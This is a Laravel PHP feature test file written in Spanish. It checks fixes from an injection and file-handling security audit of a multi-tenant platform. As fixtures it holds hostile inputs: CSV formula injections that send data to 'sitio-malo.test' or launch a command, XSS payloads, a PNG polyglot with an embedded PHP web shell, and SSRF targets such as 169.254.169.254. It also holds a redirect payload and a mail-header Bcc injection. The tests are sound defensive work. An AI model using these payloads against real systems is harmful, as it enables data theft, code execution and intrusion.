<?php

namespace Tests\Feature\SeguridadAuditoria;

use App\Mail\AltaProvisionalRegistrada;
use App\Models\Auditoria;
use App\Models\ConfiguracionPlataforma;
use App\Models\Empresa;
use App\Models\Llave;
use App\Models\Sede;
use App\Models\User;
use App\Services\Firmas\Firmas;
use App\Support\CorreoPlataforma;
use App\Support\Csv;
use App\Support\Identidad;
use App\Support\Tenancy\Tenant;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use Illuminate\Validation\ValidationException;
use Tests\Feature\Nucleo\CreaDatosNucleo;
use Tests\TestCase;

/**
 * Auditoría de seguridad 2026-10-06: inyección, XSS y manejo de archivos.
 * Cada prueba corresponde a un hallazgo INY-xx de
 * docs/seguridad/auditoria-2026-10-06-inyeccion.md.
 */
class InyeccionTest extends TestCase
{
    use CreaDatosNucleo, RefreshDatabase;

    private const XSS = '<img src=x onerror=alert(1)>"><svg/onload=alert(2)>';

    private Empresa $empresa;

    private Sede $centro;

    private User $admin;

    protected function setUp(): void
    {
        parent::setUp();
        $this->sembrarCatalogo();
        $this->empresa = $this->crearEmpresa();
        $this->centro = $this->crearSede($this->empresa, 'CEN');
        $this->admin = $this->crearUsuario($this->empresa, 'Administrador');
    }

    private function enEmpresa(callable $fn): mixed
    {
        return app(Tenant::class)->conEmpresa($this->empresa->id, $fn);
    }

    private function llave(string $nomenclatura, string $descripcion): Llave
    {
        return $this->enEmpresa(function () use ($nomenclatura, $descripcion) {
            $l = new Llave(['sede_id' => $this->centro->id, 'nomenclatura' => $nomenclatura, 'descripcion' => $descripcion,
                'tipo_dispositivo' => 'metalica', 'alcance' => 'global']);
            $l->save();

            return $l;
        });
    }

    /** PNG válido con HTML/JS/PHP pegado al final (un "políglota"). */
    private function pngPoliglota(string $nombre = 'logo.png'): UploadedFile
    {
        $img = imagecreatetruecolor(64, 64);
        imagefill($img, 0, 0, imagecolorallocate($img, 10, 120, 200));
        ob_start();
        imagepng($img);
        $png = (string) ob_get_clean();
        $ruta = tempnam(sys_get_temp_dir(), 'png');
        file_put_contents($ruta, $png.'<script>alert(document.cookie)</script><?php system($_GET["c"]); ?>');

        return new UploadedFile($ruta, $nombre, 'image/png', null, true);
    }

    private function archivoFalso(string $nombre, string $contenido, string $tipo): UploadedFile
    {
        $ruta = tempnam(sys_get_temp_dir(), 'sub');
        file_put_contents($ruta, $contenido);

        return new UploadedFile($ruta, $nombre, $tipo, null, true);
    }

    // ---------------------------------------------------- INY-01 Fórmulas en CSV

    public function test_iny01_las_celdas_que_parecen_formula_se_neutralizan(): void
    {
        foreach (['=HYPERLINK("http://malo/?"&A1,"Ver")', '+1+1', '-2+3', '@SUMA(A1)', "\tcmd", "\r=1", "=cmd|' /C calc'!A0"] as $peligrosa) {
            $this->assertSame("'".$peligrosa, Csv::celda($peligrosa), $peligrosa);
        }
        foreach (['Texto normal', '-12', '+5.5', '3', '', 'A=B', ' =1'] as $segura) {
            $this->assertSame($segura, Csv::celda($segura), $segura);
        }
        $this->assertSame(15, Csv::celda(15));
        $this->assertNull(Csv::celda(null));
    }

    public function test_iny01_la_exportacion_de_llaves_no_entrega_formulas_ejecutables(): void
    {
        $this->llave('HDC-01', '=HYPERLINK("http://sitio-malo.test/?d="&A2,"Clic aquí")');

        $csv = $this->actingAs($this->admin)->get('/llaves/exportar')->assertOk()->streamedContent();

        $this->assertStringContainsString('"\'=HYPERLINK(""http://sitio-malo.test/?d=""&A2,""Clic aquí"")"', $csv);
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?=HYPERLINK/m', $csv);
    }

    public function test_iny01_la_exportacion_de_la_bitacora_de_auditoria_tambien_se_neutraliza(): void
    {
        $this->admin->forceFill(['name' => '@SUM(1+1)*cmd|\' /C calc\'!A0'])->save();
        Auditoria::create(['empresa_id' => $this->empresa->id, 'user_id' => $this->admin->id, 'evento' => 'llaves.creada',
            'auditable_type' => Llave::class, 'auditable_id' => 1, 'ip' => '127.0.0.1', 'antes' => null, 'despues' => ['nombre' => 'x']]);

        $csv = $this->actingAs($this->admin)->get('/auditoria/exportar')->assertOk()->streamedContent();

        $this->assertStringContainsString("'@SUM(1+1)", $csv);
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?@SUM/m', $csv);
    }

    // ------------------------------------------- INY-02 Imágenes re-codificadas

    public function test_iny02_el_simbolo_de_identidad_se_guarda_redibujado_sin_codigo_pegado(): void
    {
        Storage::fake('public');
        $sa = $this->crearSuperadmin();

        $this->actingAs($sa)->put('/identidad', [
            'nombre' => 'Plataforma', 'nombre_corto' => 'Plat', 'color_primario' => '#112233', 'color_acento' => '#445566',
            'simbolo' => $this->pngPoliglota('simbolo.php.png'),
        ])->assertSessionHasNoErrors();

        $this->app->forgetScopedInstances();
        $ruta = substr((string) app(Identidad::class)->get('simbolo'), strlen('storage/'));
        $this->assertMatchesRegularExpression('#^identidad/[A-Za-z0-9]{40}\.png$#', $ruta);
        $contenido = Storage::disk('public')->get($ruta);
        $this->assertNotFalse(@imagecreatefromstring($contenido));
        $this->assertStringNotContainsString('<script', $contenido);
        $this->assertStringNotContainsString('<?php', $contenido);
    }

    public function test_iny02_svg_o_html_disfrazados_de_png_se_rechazan(): void
    {
        Storage::fake('public');
        $sa = $this->crearSuperadmin();
        $base = ['nombre' => 'Plataforma', 'nombre_corto' => 'Plat', 'color_primario' => '#112233', 'color_acento' => '#445566'];

        $svg = $this->archivoFalso('logo.png', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image/png');
        $this->actingAs($sa)->put('/identidad', $base + ['simbolo' => $svg])->assertSessionHasErrors('simbolo');

        $html = $this->archivoFalso('favicon.png', '<html><body><script>alert(1)</script></body></html>', 'image/png');
        $this->actingAs($sa)->put('/identidad', $base + ['favicon' => $html])->assertSessionHasErrors('favicon');

        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    public function test_iny02_el_logo_de_la_empresa_se_guarda_redibujado(): void
    {
        Storage::fake('public');
        $sa = $this->crearSuperadmin();

        $this->actingAs($sa)->put("/empresas/{$this->empresa->id}", [
            'nombre_comercial' => 'Hotel Uno', 'razon_social' => 'Hotel Uno SA de CV', 'rfc' => 'HUN010101AB1', 'zona_horaria' => 'America/Cancun',
            'logo' => $this->pngPoliglota('logo.html'),
        ])->assertSessionHasNoErrors();

        $ruta = substr((string) $this->empresa->fresh()->logo_ruta, strlen('storage/'));
        $this->assertMatchesRegularExpression('#^empresas/logos/[A-Za-z0-9]{40}\.png$#', $ruta);
        $this->assertStringNotContainsString('<script', Storage::disk('public')->get($ruta));
    }

    public function test_iny02_la_firma_se_guarda_redibujada_y_se_entrega_como_imagen(): void
    {
        Storage::fake('local');
        $img = imagecreatetruecolor(300, 100);
        imagefill($img, 0, 0, imagecolorallocate($img, 255, 255, 255));
        ob_start();
        imagejpeg($img, null, 70);
        $jpeg = (string) ob_get_clean();
        $dataUrl = 'data:image/jpeg;base64,'.base64_encode($jpeg.'<html><script>alert(1)</script></html>');

        $ruta = $this->enEmpresa(fn () => app(Firmas::class)->guardar($dataUrl, 'pruebas'));

        $this->assertStringEndsWith('.jpg', $ruta);
        $guardado = Storage::disk('local')->get($ruta);
        $this->assertStringNotContainsString('<script', $guardado);
        $this->assertSame(IMAGETYPE_JPEG, getimagesizefromstring($guardado)[2]);

        $respuesta = $this->enEmpresa(fn () => app(Firmas::class)->respuesta($ruta));
        $this->assertSame('nosniff', $respuesta->headers->get('X-Content-Type-Options'));
        $this->assertSame('image/jpeg', $respuesta->headers->get('Content-Type'));

        // Un GIF o un texto con prefijo de imagen no pasan
        $gif = 'data:image/png;base64,'.base64_encode('GIF89a'.str_repeat("\0", 200));
        $this->expectException(ValidationException::class);
        $this->enEmpresa(fn () => app(Firmas::class)->guardar($gif, 'pruebas'));
    }

    // --------------------------------------------------- INY-03 SMTP (SSRF)

    public function test_iny03_el_correo_solo_acepta_puertos_smtp_y_no_direcciones_reservadas(): void
    {
        $sa = $this->crearSuperadmin();
        $datos = fn (array $extra) => array_merge(['host' => 'mail.ejemplo.com', 'puerto' => 587, 'cifrado' => 'tls',
            'remitente_correo' => 'avisos@ejemplo.com'], $extra);

        foreach ([22, 80, 3306, 6379, 11211] as $puerto) {
            $this->actingAs($sa)->put('/configuracion/correo', $datos(['puerto' => $puerto]))->assertSessionHasErrors('puerto');
        }
        foreach (['169.254.169.254', '2852039166', '0.0.0.0', '224.0.0.1', '0', '::ffff:169.254.169.254', 'fe80::1'] as $host) {
            $this->assertNotNull(CorreoPlataforma::problemaDestino($host, 587), $host);
        }
        $this->actingAs($sa)->put('/configuracion/correo', $datos(['host' => '169.254.169.254']))->assertSessionHasErrors('host');

        // Servidores normales (también uno interno o local) siguen permitidos
        $this->assertNull(CorreoPlataforma::problemaDestino('10.0.0.5', 465));
        $this->assertNull(CorreoPlataforma::problemaDestino('127.0.0.1', 25));
        $this->actingAs($sa)->put('/configuracion/correo', $datos([]))->assertSessionHasNoErrors();
    }

    public function test_iny03_una_configuracion_antigua_con_puerto_no_smtp_no_se_usa(): void
    {
        ConfiguracionPlataforma::create(['clave' => CorreoPlataforma::CLAVE, 'valor' => [
            'host' => '127.0.0.1', 'puerto' => 6379, 'cifrado' => 'ninguno', 'remitente_correo' => 'a@ejemplo.com']]);
        Mail::shouldReceive('mailer')->never();

        $correo = app(CorreoPlataforma::class);
        $this->assertFalse($correo->enviar('b@ejemplo.com', new AltaProvisionalRegistrada('X', null, 'Y', 'hoy', 'https://ejemplo.com')));
        $this->assertStringContainsString('puerto de correo', (string) $correo->datos()['ultimo_error']);
    }

    // -------------------------------- INY-04 Disco privado sin ruta /storage

    public function test_iny04_el_disco_privado_no_publica_la_ruta_storage(): void
    {
        $this->assertFalse(Route::has('storage.local'));
        Storage::disk('local')->put('respaldos/respaldo_local_20261006_030000_diario.sql.gz', 'datos');

        $this->actingAs($this->crearSuperadmin())->get('/storage/respaldos/respaldo_local_20261006_030000_diario.sql.gz')->assertNotFound();
    }

    // ----------------------------- INY-05 Parámetros como arreglo (error 500)

    public function test_iny05_parametros_de_texto_enviados_como_arreglo_no_rompen_las_pantallas(): void
    {
        $urls = [
            '/colaboradores/buscar?q[]=a', '/personas/buscar?q[]=a', '/proveedores/buscar?q[]=a', '/vehiculos/buscar?q[a][b]=a',
            '/transporte?q[]=a&estatus[]=a&tipo[]=a&estado[]=a', '/transporte/reportes?q[]=a&estatus[]=a',
            '/vouchers?q[]=a&origen[]=a&cobro[]=1', '/novedades?abrir[]=1', '/robos?abrir[]=1',
            "/rutas/sede/{$this->centro->id}?tab[]=a", "/rutas/sede/{$this->centro->id}/dia?fecha[]=a",
        ];
        foreach ($urls as $url) {
            $estado = $this->actingAs($this->admin)->get($url)->getStatusCode();
            $this->assertLessThan(500, $estado, $url);
        }

        foreach (['/departamentos', '/puestos', '/turnos'] as $url) {
            $this->assertLessThan(500, $this->actingAs($this->admin)->post($url, ['nombre' => ['a']])->getStatusCode(), $url);
        }
        $this->assertLessThan(500, $this->actingAs($this->admin)->post('/proveedores', ['nombre' => ['a'], 'direccion' => ['b'], 'rfc' => ['c']])->getStatusCode());
        $this->assertLessThan(500, $this->actingAs($this->crearSuperadmin())->post('/empresas', ['rfc' => ['a']])->getStatusCode());
    }

    // ------------------------------------------- INY-06 Redirección y filtros

    public function test_iny06_cambiar_de_empresa_no_redirige_a_otro_sitio(): void
    {
        $sa = $this->crearSuperadmin();

        $this->actingAs($sa)->withHeader('referer', '/\\sitio-malo.test/robar')->post('/empresa-activa', ['empresa_id' => $this->empresa->id])
            ->assertRedirect(route('panel'));
        $this->actingAs($sa)->withHeader('referer', 'https://sitio-malo.test/x')->post('/empresa-activa', ['empresa_id' => $this->empresa->id])
            ->assertRedirect(route('panel'));
        $this->actingAs($sa)->withHeader('referer', url('/llaves?rol=3'))->post('/empresa-activa', ['empresa_id' => $this->empresa->id])
            ->assertRedirect(url('/llaves'));
    }

    public function test_iny07_el_filtro_por_modulo_de_la_bitacora_no_usa_comodines(): void
    {
        foreach (['prestamo_llaves.creado', 'prestamoXllaves.creado', 'prestamo_llaves_extra.creado'] as $evento) {
            Auditoria::create(['empresa_id' => $this->empresa->id, 'user_id' => $this->admin->id, 'evento' => $evento,
                'auditable_type' => Llave::class, 'auditable_id' => 1, 'ip' => '127.0.0.1', 'antes' => null, 'despues' => ['nota' => $evento]]);
        }

        $csv = $this->actingAs($this->admin)->get('/auditoria/exportar?modulo=prestamo_llaves')->assertOk()->streamedContent();

        $this->assertSame(1, substr_count($csv, "\n") - 1, $csv);
    }

    // --------------------------------------------- XSS almacenado y correo

    public function test_xss_almacenado_en_llaves_y_colores_de_identidad_se_escapa(): void
    {
        $this->llave('HDC-'.self::XSS, 'Abre '.self::XSS);
        ConfiguracionPlataforma::create(['clave' => 'identidad', 'valor' => [
            'nombre' => 'N'.self::XSS, 'color_primario' => 'red;}</style><script>alert(3)</script><style>', 'color_acento' => '#000;background:url(//x)']]);

        $pagina = $this->actingAs($this->admin)->get('/llaves')->assertOk()->getContent();

        $this->assertStringNotContainsString('<img src=x', $pagina);
        $this->assertStringNotContainsString('<svg/onload', $pagina);
        $this->assertStringNotContainsString('<script>alert(3)', $pagina);
        $this->assertStringContainsString('--color-primario: #2563eb; --color-acento: #0ea5e9;', $pagina);
        $this->assertStringContainsString(e('Abre '.self::XSS), $pagina);
    }

    public function test_un_nombre_con_saltos_de_linea_no_inyecta_encabezados_en_el_correo(): void
    {
        config(['mail.default' => 'array']);

        Mail::to('rh@ejemplo.com')->send(new AltaProvisionalRegistrada("Juan\r\nBcc: espia@sitio-malo.test", 'Centro', 'Guardia', 'hoy', 'https://ejemplo.com'));

        $mensaje = app('mailer')->getSymfonyTransport()->messages()->first()->getOriginalMessage();
        $this->assertSame([], $mensaje->getBcc());
        $this->assertDoesNotMatchRegularExpression('/^Bcc:/mi', $mensaje->getHeaders()->toString());
    }
}
